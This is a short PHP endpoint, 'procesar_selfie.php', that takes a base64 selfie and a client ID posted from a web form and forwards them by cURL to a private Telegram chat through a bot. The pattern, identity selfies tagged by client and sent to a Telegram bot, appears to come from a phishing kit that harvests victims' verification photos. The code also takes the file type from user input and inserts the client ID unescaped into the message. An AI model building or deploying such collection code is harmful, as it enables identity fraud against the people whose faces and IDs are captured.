<?php
// modules/api/procesar_selfie.php
// Procesar imagen Base64 y enviar a Telegram

$config = require '../../config/config.php';
$botToken = $config['botToken'];
$chatId = $config['chatId'];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['selfie'])) {

    $cliente_id = $_POST['cliente_id'] ?? 'Desconocido';
    $dataUrl = $_POST['selfie'];

    // Extraer base64
    // formato: "data:image/jpeg;base64,/9j/4AAQSw..."
    if (preg_match('/^data:image\/(\w+);base64,/', $dataUrl, $type)) {
        $encoded_string = substr($dataUrl, strpos($dataUrl, ',') + 1);
        $type = strtolower($type[1]); // jpg, png, gif

        $decoded_file = base64_decode($encoded_string);

        // Guardar temporalmente
        $tempFile = tempnam(sys_get_temp_dir(), 'selfie_') . '.' . $type;
        file_put_contents($tempFile, $decoded_file);

        // Enviar a Telegram
        $url = "https://api.telegram.org/bot$botToken/sendPhoto";

        $post_fields = [
            'chat_id' => $chatId,
            'photo' => new CURLFile($tempFile),
            'caption' => "📸 *Nueva Selfie Recibida*\n🆔 Cliente: `$cliente_id`",
            'parse_mode' => 'Markdown'
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Content-Type:multipart/form-data"
        ));
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        $output = curl_exec($ch);
        curl_close($ch);

        // Borrar temp
        unlink($tempFile);

        // Responder OK
        http_response_code(200);
        echo json_encode(['status' => 'ok']);
    } else {
        http_response_code(400);
        echo json_encode(['error' => 'Formato de imagen inválido']);
    }

} else {
    http_response_code(400);
    echo json_encode(['error' => 'No data']);
}
?>